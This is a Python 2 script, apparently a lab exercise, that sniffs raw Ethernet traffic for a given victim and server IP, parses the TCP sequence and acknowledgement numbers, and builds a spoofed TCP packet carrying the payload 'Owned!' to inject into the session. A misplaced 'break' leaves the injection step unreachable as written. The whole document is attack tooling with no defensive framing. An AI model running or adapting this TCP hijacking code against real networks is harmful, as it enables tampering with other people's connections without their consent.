import socket
import struct
import binascii
import sys
from sendPacket import IPPacket
from sendPacket import TCPPacket

victimIP = sys.argv[1]
serverIP = sys.argv[2]

sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket. htons(
    0x0800))  # third argument denotes to IP Protocol
sock2 = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

print "socket has been established"


sourceIP = ""
destIP = ""
sourcePort = 0
destPort = 0
seqNo = 0
ackNo = 0
while True:
    packet = sock.recvfrom(65535)
    ethernet_header = packet[0][0:14]
    # the ! stands for network order
    eth_header = struct.unpack("!6s6s2s", ethernet_header)
    ipheader = packet[0][14:34]
    ip_header = struct.unpack("!12s4s4s", ipheader)
    tcp_header = packet[0][34:54]
    tcp_info = struct.unpack("!HHLL8s", tcp_header)

    sourceIP = socket.inet_ntoa(ip_header[1])
    destIP = socket.inet_ntoa(ip_header[2])
    sourcePort = tcp_info[0]
    destPort = tcp_info[1]
    seqNo = tcp_info[2]
    ackNo = tcp_info[3]

    if(destIP == victimIP or destIP == serverIP):
        print "Destination MAC:" + binascii.hexlify(eth_header[0]) + " Source MAC:" + binascii.hexlify(
            eth_header[1]) + " Type:" + binascii.hexlify(eth_header[2])
        print "Source IP:" + sourceIP + " Destination IP:" + destIP
        print "Source Port:" + str(sourcePort) + \
            " Destination Port: "+str(destPort)
        print "seqNo: " + str(seqNo) + " ackNo: "+str(ackNo)
        break
        data = "Owned!"
        ip = IPPacket(destIP, sourceIP)
        ip.assemble_ipv4_feilds()
        tcp = TCPPacket(destPort, sourcePort, destIP,
                        sourceIP, seqNo, ackNo, data)
        tcp.assemble_tcp_feilds()

        sock2.sendto(ip.raw+tcp.raw+struct.pack("!6s", data),
                     (destIP, destPort))
        print "packet sent\n\n"
